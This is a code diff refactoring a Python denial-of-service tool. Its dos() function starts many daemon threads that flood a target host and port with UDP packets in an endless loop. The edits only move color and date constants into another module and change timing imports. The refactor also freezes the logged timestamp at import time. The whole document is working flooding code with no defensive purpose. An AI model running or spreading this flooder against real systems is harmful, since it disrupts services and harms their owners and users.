@@ -1,13 +1,9 @@
-import datetime
 import random
 import socket
 import threading
-import time
+from time import perf_counter
 
-import colorama
-
-color = colorama.Fore
-date = datetime.datetime.now().time()
+from consts import COLOR, DATE
 
 
 def dos(host=None, thread=None, port=None):
@@ -25,16 +21,16 @@ def dos(host=None, thread=None, port=None):
     def send_packets():
         while True:
             try:
-                date = datetime.datetime.now().time()
+
                 print(
-                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.YELLOW} Done Send new requests to {color.GREEN}{host} "
+                    f"{COLOR.WHITE}[{COLOR.BLUE}{DATE}{COLOR.WHITE}]{COLOR.YELLOW} Done Send new requests to {COLOR.GREEN}{host} "
                 )
                 sock.sendto(data, (host, port))
             except:
                 pass
 
-    start_time = time.perf_counter()
-    for i in range(thread):
+    start_time = perf_counter()  #! not accessed
+    for i in range(thread):  #! not accessed
         t = threading.Thread(target=send_packets)
         t.daemon = True
         t.start()
